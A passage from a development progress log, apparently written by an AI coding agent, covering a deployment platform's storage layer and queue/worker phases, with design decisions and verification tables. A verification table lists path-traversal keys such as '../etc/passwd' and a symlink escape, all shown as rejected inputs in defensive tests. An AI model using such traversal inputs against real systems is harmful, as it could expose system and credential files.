- `FILE_COMPRESSIONS` / `fileCompressionSchema`.
- `storedFileSchema` extended with `parentFileId`, `compression`, `uncompressedBytes`,
  `uncompressedChecksum`.
- `artifactResultSchema` (`file`, `ratio`, `durationMs`, `threadId`), `storageUsageSchema`,
  `fileListQuerySchema`.

**`packages/config`**
- `GZIP_LEVEL` (1–9, default 6) and `COMPRESSION_THREADS` (1–16, default 2), documented in
  `.env.example`.

**`apps/api`**
- `lib/object-store.ts` — the single `LocalObjectStore` handle; the one place that injects
  `STORAGE_ROOT` and the pool size into the storage package.
- `lib/storage-path.ts` — **deleted**; its path-sandbox logic now lives in `@forge/storage`.
- `repositories/file-repository.ts` — the `files` queries moved out of `project-repository.ts`,
  plus `listProjectFileIndex()` (keys only, for reconciliation) and `deleteFileRow()`.
- `services/upload-service.ts` — rewritten onto `objectStore.put()`; the multipart truncation check
  now runs in `put`'s `beforeCommit` hook, i.e. while the bytes are still only in the temp file.
- `services/file-service.ts` — `getProjectFiles`, `requireProjectFile`, `openDownload`
  (streamed, optional gunzip, safe filename, size-drift detection), `deleteProjectFile`, and
  `getStorageUsage`, which walks the store and reconciles it against the DB index to surface
  **orphans** (bytes with no row) and **missing** objects (rows with no bytes).
- `services/artifact-service.ts` — `compressProjectFile`: gzip a stored object on a worker thread,
  verify the source's recorded checksum against the hash the worker computed while reading it
  (mismatch ⇒ artifact deleted + 500), then index the artifact with both sides' sizes and hashes.
- `routes/files.ts` — `GET …/files`, `GET …/storage`, `GET …/files/:fileId/download[?decompress=true]`,
  `POST …/files/:fileId/compress`, `DELETE …/files/:fileId`.
- `services/project-service.ts` — deleting a project now drops its whole subtree from the store
  (`deletePrefix`) after the row is gone.
- `app.ts` — registers `fileRoutes`, exposes `content-disposition`/`x-forge-sha256`/`etag` through
  CORS, API version `0.3.0`. `server.ts` — `closeCompressionPool()` in the shutdown sequence.

**`apps/dashboard`**
- `lib/api.ts` — extended `StoredFile`, new `ArtifactResult`/`StorageUsage`, plus `downloadUrl()`
  and a shared `formatBytes()`.
- `components/source-upload-panel.tsx` — per-object **Download / Compress / Delete**, a live storage
  summary in the panel header (object count, total bytes, `gzip pool 1/2 busy`, orphan/missing
  warnings), and a result banner reporting ratio, duration and **which worker thread** did the gzip.
- `components/artifacts-panel.tsx` — artifacts with their compression ratio, both checksums, and two
  download buttons: the raw `.gz` and **Unpacked** (server-side gunzip).

### Decisions & assumptions

- **`@forge/storage` never reads the environment.** `ARCHITECTURE §9` allows `storage → shared` only,
  so the root and pool size are constructor/`configure()` arguments injected by
  `apps/api/src/lib/object-store.ts`. Keeps the package testable with a temp dir and honest about the
  documented boundary.
- **Keys, not paths, are the public vocabulary.** Callers pass `<org>/<project>/sources/<uuid>.zip`;
  only the store turns that into a filesystem path. `files.storage_path` stores the key.
- **Writes commit by `rename()`.** Chosen over "write in place then clean up on failure" (Phase 2's
  approach) because a partial object is never *visible* at all, not even briefly — which matters once
  a worker may read a source while an upload is running.
- **Dot-prefixed key segments are rejected** so staged temp files (`.<uuid>.part`) can never collide
  with a real key and `list()` can skip them with one rule.
- **`put()` takes a `beforeCommit` hook** rather than the API deleting a bad object afterwards. That's
  what lets the multipart truncation check happen pre-commit.
- **Whole-object gzip goes to a worker thread; streaming gunzip on download does not.** zlib's
  *stream* API already runs on the libuv threadpool, so inflating during a download doesn't block the
  loop. The worker thread earns its place for the full pipeline, where the sha256 passes around the
  gzip are synchronous main-thread work and a 40 MiB archive is ~1 s of CPU. Measured below.
- **Pool size defaults to 2, not `cpus-1`.** The point of the thread is that the API stays responsive;
  saturating every core with gzip would defeat it. Configurable via `COMPRESSION_THREADS`.
- **Compression metadata on `files`, not a separate `artifacts` table.** An artifact *is* a stored
  object; four nullable columns beat a second table plus a join. `checksum`/`size_bytes` **always**
  describe the bytes as stored, and `uncompressed_*` the original — so a decompressed download can be
  verified without gunzipping anything first.
- **`parent_file_id` is `ON DELETE SET NULL`.** Deleting a source shouldn't silently delete an
  artifact built from it.
- **The download route deliberately has no `200` response schema.** With `fastify-type-provider-zod`,
  declaring one makes the serializer try to JSON-encode the `Readable`; error shapes come from the
  error-handler plugin anyway.
- **`?decompress=true` exists as the round-trip proof** (and as the thing Phase 6 will use to read a
  gzipped log back). Content-length is served from `uncompressed_bytes` when known.
- **`x-forge-sha256` + `etag`** are set to the hash of *exactly* the bytes that response sends, so a
  client can verify without a second request. `cache-control: private, no-store` because objects are
  per-org and behind auth.
- **`GET …/storage` walks the disk instead of summing the DB.** Drift is the interesting signal; a sum
  of `files.size_bytes` could never show an orphan. It also reports live pool stats, which is what the
  dashboard header renders.
- **`deletePrefix` was added beyond the roadmap's `put/get/list/delete`** because project deletion
  needed it; it refuses an empty prefix so it can't nuke the whole store.
- **Deleting an object removes the bytes first, then the row** — a failure between the two shows up as
  `missingCount`, which is visible, rather than a row pointing at bytes that are gone.
- **Compressing is `member`+ and rate-limited to 20/min** (each call pins a thread); listing and
  downloading are any-member; deleting is `member`+.
- **Compression is only offered from `source`/`log` objects**, and re-compressing an artifact is a
  `409`. Compressing the same source twice is allowed and produces two artifacts — dedup isn't worth
  the complexity before real builds exist.
- `checksumObject()` is exported and unit-verified but not wired to a route; the artifact path already
  gets the same verification for free.

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm install` → `pnpm build` | ✅ 5 packages + api (tsc) + dashboard (`next build`, 8 routes) |
| `pnpm typecheck` | ✅ clean across all 6 workspaces |
| `pnpm lint` | ✅ clean |
| `migrate up` | ✅ 4 columns + 2 check constraints + index |
| `migrate down` then `up` | ✅ rolls back and re-applies cleanly |
| **Package smoke test** (temp root, no API) | ✅ see rows below |
| `put` 4.14 MB stream | ✅ sha256 matches an independent `hashlib` digest of the same bytes |
| `get` → collected chunks | ✅ byte-identical to the input |
| `head` present / absent | ✅ key+size / `null` |
| `gzipObject` 4 139 946 B → 21 652 B | ✅ ratio 0.0052, 21 ms, **`threadId: 1`** |
| `gunzipObject` round trip | ✅ output checksum == original upload checksum |
| `checksumObject` re-read | ✅ matches |
| `put` with `limitBytes: 1024` | ✅ `OBJECT_TOO_LARGE`; `head` afterwards → `null` (**no partial object**) |
| `put` of 0 bytes | ✅ `EMPTY_OBJECT` |
| Key rejection: `../etc/passwd`, `<uuid>/../../escape`, `/abs/path`, `a//b`, `a/./b`, `trailing/`, `""` | ✅ all 7 → `INVALID_STORAGE_KEY` |
| **Symlink planted inside the root** pointing at `/tmp/forge-outside-secret.txt` | ✅ `get` → `INVALID_STORAGE_KEY` (400); `list()` does not report it |
| `delete` twice | ✅ `true` then `false` (idempotent) |
| `deletePrefix('<org>/<proj>')` / `deletePrefix('')` | ✅ 2 objects removed / refused with `INVALID_STORAGE_KEY` |
| **API upload** of a 1 110 361 B zip | ✅ `201`; `checksum` == `sha256sum` of the local file (`9bb2703e…`) |
| **API download** of the same object | ✅ `200`, `cmp` reports **identical bytes**; `content-length: 1110361`, `x-forge-sha256` + `etag` == the checksum, `content-disposition: attachment; filename="sample-app.zip"`, `cache-control: private, no-store` |
| **Compress** that source | ✅ `201`, 1 110 361 → 3 040 B, ratio 0.0027, 9 ms, **thread 3**; `uncompressedChecksum` == the source checksum |
| Raw `.gz` download → `sha256sum` | ✅ matches the artifact's recorded checksum; local `gunzip -c \| sha256sum` == the original |
| **`?decompress=true` download** | ✅ `200`, 1 110 361 bytes, `cmp` vs the original zip → **identical**; `x-forge-sha256` == original hash |
| Compress an artifact | ✅ `409 ALREADY_COMPRESSED` |
| `?decompress=true` on a plain source | ✅ `400 NOT_COMPRESSED` |
| Unknown / non-uuid file id | ✅ `404 FILE_NOT_FOUND` / `400 VALIDATION_ERROR` |
| `GET …/files` and `?kind=artifact` | ✅ both kinds listed; filter returns only the artifact |
| `GET …/storage` | ✅ `objectCount: 2`, per-kind split, live pool stats |
| **60 MiB upload vs the 50 MiB cap** | ✅ `400 OBJECT_TOO_LARGE`; **0 `.part` files** anywhere under the root (`find -name '.*'` → 0), still 1 object in `sources/` |
| Empty upload / `.exe` upload | ✅ `400 EMPTY_OBJECT` / `400 UNSUPPORTED_FILE_TYPE` |
| Object modes on disk | ✅ `-rw-r-----` (0640) for both source and artifact |
| **Orphan** (4 KiB planted directly on disk) | ✅ `orphanCount: 1`, `orphanBytes: 4096` |
| **Object removed underneath the index** | ✅ download → `404 OBJECT_MISSING`, `missingCount: 1`; after restoring the file → `200` |
| Delete an object, then again | ✅ `204` then `404` |
| **Delete a project** with 1 source + 1 artifact | ✅ `204`, `files` rows 0, and the project's subtree is **gone from the store** |
| RBAC: `viewer` API key — list / download | ✅ `200` / `200` |
| RBAC: `viewer` API key — compress / delete | ✅ `403` both, "requires the \"member\" role" |
| No credential | ✅ `401 UNAUTHORIZED` |
| Another org's member on the same project | ✅ `404 ORG_NOT_FOUND` for both download and `/storage` |
| **Event loop under load**: 4 concurrent gzips of a 40 MiB *incompressible* archive | ✅ each 964–1 056 ms on threads 3 and 4 (ratio 1.0003 — gzip grows random data, as expected); pool sampled at **2 busy / 2 queued**; 200 `/health` probes during it: **p50 1.8 ms, max 23 ms** |
| **Graceful shutdown mid-gzip** (SIGTERM 300 ms into a 30 MiB compression) | ✅ listener closed immediately (a fresh `/health` was refused), the in-flight request still returned `201` with the artifact committed, then `shutdown complete` and a clean exit |
| **Browser E2E (headless Chrome via CDP)**: register → create project → upload → compress → download → unpacked download → delete | ✅ **13/13** checks, incl. `content-disposition` = attachment, the response bytes hashing (SubtleCrypto) to `x-forge-sha256`, the unpacked artifact hashing to the *original* source hash, the ratio/duration/thread banner, and **0 console errors** |

### Not done / deferred on purpose

- **Still no Vitest suites.** Verification is a scratchpad smoke script + curl + a CDP browser script.
  This is now three phases of accumulated test debt and the biggest gap in the project.
- **No `kind='log'` objects yet.** The download route is kind-agnostic and `logKey()` exists, but
  nothing writes log objects until Phase 6.
- **No `Range` header support** — downloads are all-or-nothing, no resume.
- **No storage garbage collection.** Orphans and missing objects are *reported* by `GET …/storage`
  but nothing sweeps them; superseded source uploads are still never pruned.
- **No per-org quota or `usage` metering** (`bytes_stored` is in `DATA_MODEL.md`, unused).
- **No artifact dedup or retention policy** — compressing the same source twice yields two artifacts.
- **Artifacts are gzip of a single object**, not a tar of a build directory. Packaging a real build
  tree is Phase 6/7, where `gzipObject` gets reused.
- **The store is still local-filesystem only.** The interface is S3-shaped but there is no second
  implementation, so "swappable" is a claim, not a tested fact.
- **`compressionPoolStats()` is not on `/metrics`** — that's Phase 9; today it surfaces only through
  `GET …/storage` and the dashboard header.
- Archives are still never unpacked or validated as archives (zip-slip/zip-bomb remain Phase 6).

### Next up — Phase 4 (Queue & worker skeleton)

`packages/queue` with the BullMQ `deployments` queue and a Zod-typed job payload in `@forge/shared`;
`POST /deployments` inserting a `queued` deployment, enqueuing, returning `202` and honouring the
idempotency key; and `apps/worker` as a BullMQ processor that claims a job and walks the fake stages
to `live`, persisting every transition to `deployments` + `deployment_events` with a worker registry
and heartbeat. That needs the migration Phase 2 and 3 both deferred: the `deployments` table, plus the
two forward-reference FKs (`projects.active_deployment_id`, `files.deployment_id`). Storage is ready
for it — `logKey()` and `artifactKey()` already carry a deployment id, and the worker will construct
its own `LocalObjectStore` the same way the API does.

---

## Phase 4 — Queue & worker skeleton ✅

**Goal:** clicking Deploy creates a job that a worker picks up (no real build yet).
**Completed:** 2026-09-06.

### What shipped

**`packages/shared`** (`src/deployments.ts`)
- **`DEPLOYMENT_TRANSITIONS` + `canTransition()`** — `ARCHITECTURE §4`'s state machine as executable
  code, shared by the API and the worker. An illegal transition throws rather than writing an
  impossible row.
- `DEPLOYMENT_PIPELINE_STAGES` (the nine happy-path statuses, in order),
  `DEPLOYMENT_STATUS_LABELS`, `pipelineStageIndex()` — one definition of "how far along is this",
  used by both the worker's stage list and the dashboard's progress bar.
- Zod schemas + types: `deploymentSchema`, `createDeploymentSchema`, `deploymentListQuerySchema`,
  `deploymentEventSchema`, `deploymentEventsQuerySchema`, `workerSchema`, `workerHeartbeatSchema`,
  `queueStatsSchema`, `fleetSchema`, **`deploymentJobSchema`** (the queue payload) and
  `deploymentStatusMessageSchema` (the Pub/Sub frame Phase 5 will forward to sockets).
- `REDIS_KEYS.workersOnline`, `DEPLOYMENT_JOB_NAME`, `WORKER_HEARTBEAT_TTL_FACTOR`.

**`packages/queue`** (new, `@forge/queue` — depends on `@forge/shared` only)
- `src/connection.ts` — **the one Redis connection factory in the repo**, with three roles:
  `command` (fails a request in seconds when Redis is down), `bullmq` (`maxRetriesPerRequest: null`,
  `enableReadyCheck: false`, as BullMQ requires for blocking commands) and `subscriber` (Phase 5).
  The URL is a parameter, not an env read — `ARCHITECTURE §9` allows `queue → shared` only.
- `src/deployments-queue.ts` — `configureQueue()`, `getDeploymentsQueue()`, `enqueueDeployment()`
  (payload validated at the producer; **BullMQ job id = deployment id**), `forgetDeploymentJob()`,
  `getQueueStats()`, `createDeploymentWorker()` (`autorun: false`), `createDeploymentQueueEvents()`
  and `closeQueue()`. Every producer-side command is wrapped in `withDeadline()` — see the bugs
  section below.

**`packages/db`**
- Migration `1757400000000_deployments-workers.ts` — `deployment_status` / `worker_status` /
  `log_stream` enums, and the `workers`, `deployments`, `deployment_events` tables. The three tables
  reference each other in a cycle, so columns are created bare and the FKs added afterwards. It also
  lands **the two forward references Phases 2 and 3 deferred**: `projects.active_deployment_id` and
  `files.deployment_id`. Reversible, round-trip tested.
- `src/repositories/deployments.ts` and `src/repositories/workers.ts` — **shared repositories** (both
  the API and the worker need them; `ARCHITECTURE §2.4` puts shared repository helpers in `db`).
  Includes `claimDeployment()` (a *conditional* update, so two workers racing on a re-delivered job
  can't both claim it), `updateDeployment()`, `setActiveDeployment()`, `insertDeploymentEvent()`,
  `listDeploymentEvents()` (with an `afterId` cursor), `registerWorker()`, `heartbeatWorker()` and
  `pruneStaleWorkers()`.
- Kysely types for all three tables; `Database` extended.

**`packages/config`**
- `WORKER_NAME`, `WORKER_CONCURRENCY` (2), `WORKER_HEARTBEAT_MS` (5 000), `DEPLOY_JOB_ATTEMPTS` (1),
  `DEPLOY_JOB_BACKOFF_MS` (5 000), `DEPLOY_JOB_LOCK_MS` (60 000), `QUEUE_OPERATION_TIMEOUT_MS`
  (5 000), `DEPLOY_STAGE_DELAY_MS` (700). All documented in `.env.example`.

**`apps/api`** (version `0.4.0`)
- `lib/redis.ts` — rewritten onto `@forge/queue`'s factory (the move Phase 0 said would happen here)
  and split into **three connections**: the shared command connection, a **rate-limiter** connection
  and a **publisher** connection, the last two with ioredis's offline queue disabled. See bugs below.
- `lib/queue.ts` — the single injection point for `REDIS_URL` and the job options into `@forge/queue`,
  called from `buildApp()` before any route can enqueue.
- `services/deployment-service.ts` — `createDeployment()` resolves the source (newest uploaded
  archive unless a `sourceFileId` is given; `409 NO_SOURCE` if the project has none), honours the
  idempotency key on both the **fast path** (pre-insert lookup) and the **race path** (`23505` →
  read back the winner's row), writes the initial `queued` event, publishes it, then enqueues.
  If the enqueue fails the row is marked `failed`/`ENQUEUE_FAILED` and the caller gets a `503` —
  a `queued` row nobody will ever pick up is worse than an error.
- `services/fleet-service.ts` — queue counts from BullMQ + the `workers` registry, with **liveness
  read from Redis** (`EXISTS worker:<id>:heartbeat`) rather than the row.
- `routes/deployments.ts` — `POST` (202 new / **200 idempotency replay**), list, get, `…/events`
  (with the `afterId` replay cursor), plus org-level `GET /orgs/:orgId/deployments` and
  `GET /orgs/:orgId/fleet`.
- `services/serializers.ts` — `toDeployment`, `toDeploymentEvent`, `toWorkerView`.
- `server.ts` — `closeQueue()` added to the shutdown sequence.

**`apps/worker`** (new app, `@forge/worker`)
- `src/main.ts` — boot (ping Postgres, open Redis, prune long-dead worker rows, register, then
  `worker.run()`), BullMQ event logging (`failed` / `completed` / **`stalled`**), and graceful
  shutdown: `drain()` → `queueWorker.close()` (finishes in-flight deployments) → `unregister()` →
  close every handle, behind a `SHUTDOWN_TIMEOUT_MS` force timer.
- `src/services/worker-registry.ts` — dual registration: a durable row in `workers` and a Redis key
  with a TTL of 3 heartbeat intervals, plus the `workers:online` set. Tracks active jobs so the
  fleet view shows what is running where.
- `src/services/deployment-state.ts` — **the only place a deployment's status changes.** Postgres
  first (`deployments.status` + append `deployment_events`), then publish to `deployment:<id>` and
  `project:<id>`. Publishing is best-effort and deliberately swallowed; the durable record already
  exists and Phase 5's replay reads it back. Also `logLine()` and `failDeployment()`.
- `src/pipeline/simulated-pipeline.ts` — the real stage list, transitions and events with the work
  stubbed out: `cloning → installing → building → creating_container → starting → health_check →
  live`, each emitting a status transition (label) plus a `system` log line (the command or action
  that Phase 6/7 will actually run). Honours `fail_at`.
- `src/processor.ts` — re-reads the row (the job payload is only a pointer), skips canceled/stopped
  and already-finished deployments, re-queues a `failed` row on a retry (`failed → queued` is a legal
  transition), claims conditionally, runs the pipeline, sets `projects.active_deployment_id` on
  success, and on failure records the reason **from wherever the pipeline actually stopped** before
  rethrowing so BullMQ marks the job failed.

**`apps/dashboard`**
- `components/deployment-pipeline.tsx` — the nine-stage progress strip (done / active+pulse /
  failed-here / pending) and a `StatusBadge`. Position is derived from the server's status; the UI
  never advances a stage on its own.
- `components/deployments-panel.tsx` — Deploy button, a **simulated-failure selector**, a
  **“Double-click test”** that fires the same request twice to demonstrate idempotency, the selected
  deployment's pipeline + error box + **event timeline** (read with the `afterId` cursor and
  accumulated across polls), and the build history list.
- `app/orgs/[orgSlug]/fleet/page.tsx` + a **Fleet** nav item — queue counters, the worker table
  (status dot, host/pid, concurrency, what it's running, heartbeat age) and org-wide recent
  deployments. Polls every 2s.
- `lib/api.ts` — deployment/worker/queue types, `PIPELINE_STAGES`, `STATUS_LABELS`,
  `isSettled()`, `formatDuration()`, `formatAgo()`.

**Root** — `pnpm dev` now runs packages + api + **worker** + dashboard.

### Decisions & assumptions

- **Idempotency is a partial unique index, not the plain `UNIQUE` in `DATA_MODEL.md`.**
  `UNIQUE (project_id, source_ref, idempotency_key)` can never fire in Postgres when any column is
  NULL — which is the common case. The index is
  `(project_id, coalesce(source_ref,''), idempotency_key) WHERE idempotency_key IS NOT NULL`: it
  enforces the documented rule exactly when a key was supplied and leaves keyless deploys free to
  repeat. `DATA_MODEL.md` was updated to match.
- **`source_ref` for an upload project is the source `files.id`.** That makes the idempotency tuple
  mean something concrete: "the same source, with the same key, is the same deployment".
- **Deploying requires a stored source** (`409 NO_SOURCE`). The pipeline is simulated, but a
  deployment that isn't *of* anything would make the source/idempotency story fiction.
- **Routes are nested under the project** (`POST /orgs/:orgId/projects/:projectId/deployments`), not
  the roadmap's bare `POST /deployments`, so RBAC stays the same one-line `requireRole` check as
  everywhere else. Deploying is `member`+; reading is any member.
- **`fail_at` is a real column, not a query flag.** The demo needs a deterministic failure, the
  worker must read it from the row (the job is only a pointer), and Phase 8's failure/retry demos
  need the same hook. It becomes a no-op when Phase 6 brings real builds.
- **`DEPLOY_JOB_ATTEMPTS` defaults to 1.** Retries, `attempt` history and the dead-letter queue are
  Phase 8; the wiring (`attempt` tracked on the row, `failed → queued` re-queue, backoff config) is
  in place and was verified at `ATTEMPTS=2`, but the default keeps Phase 4's demo unambiguous.
- **Shared repositories live in `@forge/db`**, unlike the app-specific ones in `apps/api/repositories`.
  The API and the worker both drive deployments, and an app may not import another app.
- **The BullMQ job id is the deployment id.** A duplicate enqueue of the same deployment is a no-op at
  the queue level as well as in the database. The flip side: re-enqueuing an *existing* deployment
  (Phase 8's retry/rollback) must call `forgetDeploymentJob()` first or BullMQ silently ignores the
  add — noted in the code.
- **`claimDeployment` is a conditional UPDATE** (`WHERE status IN ('queued','assigned')`) rather than
  a transaction + lock: the database arbitrates, and the losing worker simply skips the job.
- **A `live` deployment gets no `url`, `container_id` or `host_port`.** Nothing is actually serving;
  writing a plausible URL would be a lie. Phase 7 fills them in. `projects.active_deployment_id`
  *is* set, since the pipeline genuinely reached `live`.
- **Status events carry the stage label, log events carry the detail.** The first draft wrote the
  same string to both, which made the timeline read as duplicates.
- **Worker liveness is Redis, not the `workers.status` column.** A SIGKILLed worker never writes
  `offline`; `toWorkerView` therefore reports `offline` for any worker whose heartbeat key has
  expired, regardless of the row.
- **`pruneStaleWorkers` only deletes rows no deployment references**, so "which worker ran this
  build" survives even when the registry is tidied.
- The dashboard **polls** (1s while a deployment moves, 2s for the fleet). Phase 5 replaces the
  polling with the WebSocket topic; the payload shapes rendered today are already the ones the
  socket will push.

### Bugs found and fixed during verification

1. **A dead Redis hung the deploy request instead of failing it.** BullMQ connections must use
   `maxRetriesPerRequest: null`, so a producer command issued while Redis is down waits *forever* —
   `POST /deployments` never returned. Fixed by wrapping every producer-side queue command in
   `withDeadline()` (`QUEUE_OPERATION_TIMEOUT_MS`, default 5s), which turns the outage into a clean
   `503 QUEUE_UNAVAILABLE` plus a `failed`/`ENQUEUE_FAILED` row.
2. **`lazyConnect` made connections unrecoverable.** With ioredis's `lazyConnect`, a *first*
   connection attempt that fails leaves the client in `end` and it never retries — so an API process
   started while Redis was down stayed permanently broken (`Connection is closed.`) even after Redis
   came back. Connections are now eager, so every failure goes through `retryStrategy`. Verified by
   booting the API during an outage and watching the same process recover.
3. **A dead Redis added 4–9 s to *every* request.** The rate limiter runs on every request and fails
   open, but its INCR sat in ioredis's offline queue waiting for the retry cap. It now has its own
   connection with `enableOfflineQueue: false`, so it fails instantly and `skipOnError` serves the
   request. `/health/live` went from 4–9 s to ~0 ms with Redis down. Pipeline-event publishing got the
   same treatment (best-effort work must never add latency).
4. **The dashboard could miss a deployment's final events.** Event polling was switched off as soon
   as the deployment row read `live`, which happens a beat before the last events are fetched — so
   "Deployment is live" sometimes never appeared. Polling now stops only once the *timeline* contains
   a terminal status **and** the last poll came back empty. Caught by the browser suite (14/15 → 15/15).

Also removed: a `useFailurePoint` hook that fetched the event list a second time to find where a
failure stopped — it is derived from the timeline that is already loaded.

A second review pass over the new code found five more, all fixed:

5. **Log lines were published as `status` frames.** `logLine()` emitted a
   `deploymentStatusMessageSchema` payload with `type: 'status'`, so a subscriber could not tell a
   build log line from a state transition without re-reading Postgres — and Phase 5's gateway is
   built directly on this contract. `@forge/shared` now defines `deploymentLogMessageSchema` and a
   `deploymentMessageSchema` discriminated union; log frames carry `type: 'log'` and their `stream`.
6. **`GET …/fleet` returned 500 when Redis was down**, despite the code's own comment promising it
   would still render the worker list from Postgres: `safeQueueStats()` was guarded but the heartbeat
   read was not. `readOnline()` now returns an empty set on failure, so every worker is reported
   `offline` — the honest answer — and the page still renders.
7. **A dead Redis was indistinguishable from a paused queue.** The fallback stats returned
   `paused: true`, which the dashboard rendered as an outage banner and which would misreport a
   genuinely paused queue. `queueStatsSchema` gained an explicit `available` flag; `paused` now means
   only what it says.
8. **A dead BullMQ consumer loop went unnoticed.** `void queueWorker.run()` discarded the promise, so
   a failure of the consumer loop surfaced only as a generic unhandled rejection while the process
   kept running, registered and heartbeating, consuming nothing. It now logs fatally and shuts down.
9. **The worker leaked its BullMQ connection on shutdown.** BullMQ does not close a connection it did
   not create, and `closeQueue()` only closed the producer's. Connections handed to Workers/QueueEvents
   are tracked in `@forge/queue` and closed with the rest — the process exited anyway, but "close every
   handle, then exit" is the point of `CLAUDE.md §4`.

Hardening in the same pass: `MAX_LOG_LINE_LENGTH` (4 KiB) + `clampLogLine()` in `@forge/shared`, applied
in `logLine()`. Build output is untrusted and `CLAUDE.md §8` requires log size to be bounded; Phase 6
streams real stdout/stderr through the same function.

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm install` | ✅ 9 workspace projects (`@forge/queue`, `@forge/worker` added) |
| `pnpm typecheck` | ✅ clean across all 8 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 6 packages + api + worker (tsc) + dashboard (`next build`, 9 routes) |
| `migrate up` | ✅ 3 enums + `workers`/`deployments`/`deployment_events`, the idempotency index, and the 3 deferred FKs (`projects.active_deployment_id`, `files.deployment_id`, `workers.current_deployment_id`) |
| `migrate down` then `up` | ✅ round-trips cleanly |
| `pnpm dev` | ✅ packages + api (:4000) + **worker** + dashboard (:3000) all up; a deploy run under it reached `live` in 4 280 ms |
| Deploy with no source uploaded | ✅ `409 NO_SOURCE` |
| **Deploy** (`POST …/deployments`) | ✅ `202`, status `queued`, job enqueued |
| Full pipeline | ✅ `queued → assigned → cloning → installing → building → creating_container → starting → health_check → live`, ~4.3 s, `workerId` set, `durationMs` recorded |
| `deployment_events` timeline | ✅ 16 rows: a `status` row per transition + a `system` `log` row per stage, ids monotonic |
| `projects.active_deployment_id` | ✅ points at the deployment that went live |
| **Idempotency — replay** (same key twice, sequential) | ✅ second call `200` with the **same id**; one row |
| **Idempotency — race** (two identical requests in parallel) | ✅ one deployment; the UI's "Double-click test" reports `Two identical requests → one deployment` |
| Keyless repeat deploy of the same source | ✅ `202`, a **new** deployment (correct: no key = no promise) |
| Simulated failure (`failAt: building`) | ✅ `failed`, `errorCode: BUILDING_FAILED`, timeline stops at `building`, `durationMs` recorded |
| **Retry** (`DEPLOY_JOB_ATTEMPTS=2`) | ✅ attempt 1 fails on worker-b → `Retrying (attempt 2)` → re-claimed by **worker-a** → fails again → terminal `failed`, `attempt=2` |
| **Two workers competing** | ✅ 6 concurrent deploys → queue showed `active: 4, waiting: 2` (2 workers × concurrency 2), final split **3 / 3** |
| Worker registry + heartbeat | ✅ row in `workers`, `worker:<id>:heartbeat` present with TTL, `workers:online` set populated |
| **Graceful shutdown mid-deployment** (SIGTERM 2 s into a 4.3 s pipeline) | ✅ logs `shutting down {activeJobs: 1}`, the in-flight deployment still reached `live` (4 277 ms), then `worker unregistered` → `shutdown complete`, clean exit — re-verified after the connection-ownership fix |
| **SIGKILL a worker** | ✅ Postgres row still reads `idle` (it never got to write `offline`); heartbeat key gone after ~15 s and the API reports `status: offline, online: false` |
| **Redis Pub/Sub fan-out** | ✅ `psubscribe 'deployment:*'` received all 16 frames for one deployment, in order |
| **Redis down → deploy** | ✅ `503 QUEUE_UNAVAILABLE` (bounded at ~5 s by the deadline, 64 ms when the socket is already closed), row left as `failed`/`ENQUEUE_FAILED` |
| **Redis down → `GET …/fleet`** | ✅ `200` (was `500`): `queue.available: false`, `paused: false`, all 9 registered workers still listed from Postgres and reported `offline` |
| **Redis Pub/Sub frame types** | ✅ one deployment → 7 `status` + 7 `log` frames; every log frame carries `type: "log"` and its `stream` |
| **Redis down → `/health`** | ✅ `503` in 1.9 s with `redis.error: "redis check timed out after 3000ms"`; `/health/live` `200` in ~0 ms |
| **Redis restored, same API process** | ✅ `/health` `200`, next deploy `202` in 26 ms — no restart needed |
| Deployment queued during the outage after Redis returned | ✅ picked up by the worker and reached `live` |
| RBAC: viewer deploys | ✅ `403` "requires the \"member\" role" |
| RBAC: viewer lists deployments / reads fleet | ✅ `200` / `200` |
| No credential | ✅ `401 UNAUTHORIZED` |
| Outsider reads another org's deployments | ✅ `404 ORG_NOT_FOUND` |
| Unknown deployment id / unknown `sourceFileId` | ✅ `404 DEPLOYMENT_NOT_FOUND` / `404 SOURCE_NOT_FOUND` |
| Invalid `failAt` | ✅ `400 VALIDATION_ERROR` with the allowed enum listed |
| **Browser E2E (headless Chrome via CDP)** — register → create project → upload → Deploy → watch the pipeline → double-click test → simulated failure → fleet page | ✅ **15/15**, incl. all 7 stages appearing in the DOM, `$ npm install` / `$ npm run build` in the timeline, `BUILDING_FAILED` surfaced, queue counters and the worker listed, and **0 console errors** |
| **Browser RBAC (viewer)** | ✅ **5/5** — panel visible, no Deploy button, "requires the 'member' role" shown, and a direct `fetch` from that session still `403` |
| Both browser suites re-run after the second fix pass | ✅ **15/15** and **5/5**, still 0 console errors |

### Not done / deferred on purpose

- **Still no Vitest suites.** Four phases of accumulated test debt; verification remains curl +
  scratchpad scripts + two CDP browser suites. This is the project's biggest gap.
- **No real work happens.** `cloning`/`installing`/`building` are `setTimeout`s — Phase 6 brings
  `child_process.spawn`, log streaming and sandboxing; Phase 7 brings `dockerode`, ports and health
  checks. The state machine, persistence, publishing and failure handling around them are real.
- **No WebSocket.** Every transition and log line is published to `deployment:<id>` and
  `project:<id>` already, as the `deploymentMessageSchema` union Phase 5's gateway will consume, but
  nothing subscribes; the dashboard polls. Phase 5.
- **No cancel, stop, retry-button or rollback endpoints.** `canceled`/`stopped`/`rolled_back` exist in
  the enum and the transition table but no route reaches them. Phases 7–8.
- **No dead-letter queue.** `QUEUE_NAMES.deploymentsDlq` is defined and unused; exhausted attempts
  currently just leave the deployment `failed`. Phase 8.
- **No Redis project lock** ("one live container per project") — nothing runs a container yet. Phase 7.
- **No log objects in storage.** `deployment_events` holds the timeline; the `kind='log'` file
  dual-write lands with real logs in Phase 6.
- **`deployment:<id>:logtail`** (the bounded Redis list) is defined in `REDIS_KEYS` and unused.
- **Stalled-job recovery is wired but not demonstrated.** The `stalled` handler logs it and
  `DEPLOY_JOB_LOCK_MS` is configurable; killing a worker mid-build and watching another finish the job
  is Phase 10's demo.
- **No queue metrics on `/metrics`** — `getQueueStats()` surfaces only through `GET …/fleet`. Phase 9.
- **`workers.concurrency`/`pid`/`host` are informational**; nothing schedules on them.
- The fleet route is nested under `/orgs/:orgId` for authorization convenience even though workers and
  the queue are global infrastructure — any member of any org sees the same fleet.

### Next up — Phase 5 (Realtime: WebSockets + Pub/Sub)

The publish side is already done: the worker writes every transition to Postgres and publishes a
`deploymentMessageSchema` frame (`status` or `log`) on `deployment:<id>` and `project:<id>`. Phase 5 adds the
consumer half — a `@fastify/websocket` gateway with a hand-rolled subscribe/unsubscribe registry per
socket, one Redis subscriber connection per API process fanning out to the local sockets (the
`subscriber` role already exists in `@forge/queue`'s factory), the shared WS event contract in
